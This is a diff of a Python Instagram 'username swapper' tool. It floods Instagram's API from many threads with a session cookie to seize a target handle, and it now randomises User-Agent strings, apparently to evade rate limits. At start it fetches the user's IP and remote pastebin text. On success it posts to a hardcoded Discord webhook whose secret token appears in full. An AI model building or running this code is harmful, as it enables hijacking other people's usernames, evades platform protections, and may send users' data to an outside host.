@@ -109,7 +109,7 @@ class Design:
                     By {RoRo@m1c1}   
 """
 
-os.system('mode con: cols=80 lines=27')
+
 active = requests.get("https://api.ipify.org/?format=json").json()
 ip = active["ip"]
 scan = requests.get("https://pastebin.com/raw/miBm2ymP").text
@@ -322,6 +322,7 @@ class swap:
         Design.clearTermnal() or os.system("cls")
         self.login = login()
         self.REQ = requests.session()
+        self.sesstings1 = sessting()
         print(colored(Design.banner,"red"))
         
         try:
@@ -363,7 +364,7 @@ class swap:
         
         if self.auto.__contains__("y"):
             auto = random.randint(25,50)
-            inputc(False,"+",Design.red,f"Threads = {auto} \n");print("\n")
+            inputc(False,"+",Design.red,f"Threads = {auto} \n");print("\n\n")
             Thread(target=self.Print).start()
             autopy.alert.alert(f"Are you Ready?","DayLight Swap")
             for i in range(auto):
@@ -371,7 +372,7 @@ class swap:
         if self.auto.__contains__("n"):
             inputc(False,"\\\\",Design.red,f"If Not Use Auto Sesstings {Design.reda}(Max Threads = 75){Design.WHITE}\n")
             inputc(False,"?",Design.red,"Threads : ");self.Threads = int(input())
-            autopy.alert.alert(f"Are you Ready?","DayLight Swap")
+            autopy.alert.alert(f"Are you Ready?","DayLight Swap");print("\n\n")
             Thread(target=self.Print).start()
             for i in range(self.Threads):
                 Thread(target=self.swapper).start()
@@ -385,7 +386,7 @@ class swap:
         headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
         headers["Cookie2"] = "$Version=1"
         headers["Accept-Language"] = "en-US"
-        headers["User-Agent"] = "Instagram 152.0.0.1.60 Android"
+        headers["User-Agent"] = self.sesstings1.generateUSER_AGENT()
         return headers
     def Print(self):
         while self.run:
@@ -393,7 +394,7 @@ class swap:
                 print(f"\r[ {Design.GREEN}{q}{Design.WHITE} ] Attempt : {self.att} / Rate_Limit : {self.rl}",end="",flush=True)
     def get_info(self):
         try:
-            get = requests.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true",headers=self.headers_Api(),cookies={"sessionid":self.session}).text
+            get = self.REQ.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true",headers=self.headers_Api(),cookies={"sessionid":self.session}).text
             self.user = re.search(r'"username":"(.*?)",',get).group(1)
             self.email = re.search(r'"email":"(.*?)",',get).group(1)
             inputc(False,"+",Design.green,f"Login sucssfully as {self.user}");input()
@@ -422,7 +423,7 @@ class swap:
 
     def sucssfully_swap(self):
         self.run = False
-        print("\n");inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}\n")
+        inputc(True,"$",Design.red,f"{self.Msg} {Design.reda}@{self.Target}")
         self.REQ.post('https://i.instagram.com/api/v1/accounts/set_biography/', data={"raw_text": f"{self.bio}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android", "Cookie": "sessionid=" + self.session})
         self.REQ.post("https://i.instagram.com/api/v1/accounts/set_phone_and_name/",data={"first_name":f"{self.name}"},headers={"User-Agent": "Instagram 152.0.0.1.60 Android","Cookie": "sessionid=" + self.session})
         webhook = DiscordWebhook(url='https://discord.com/api/webhooks/899788444966985730/Uy9-NNXthTA3ncdGqNSTfteDFZYcWASapaKaJObTMr_fuIxJ7dIkzcLtDMT8OOURuJIr')
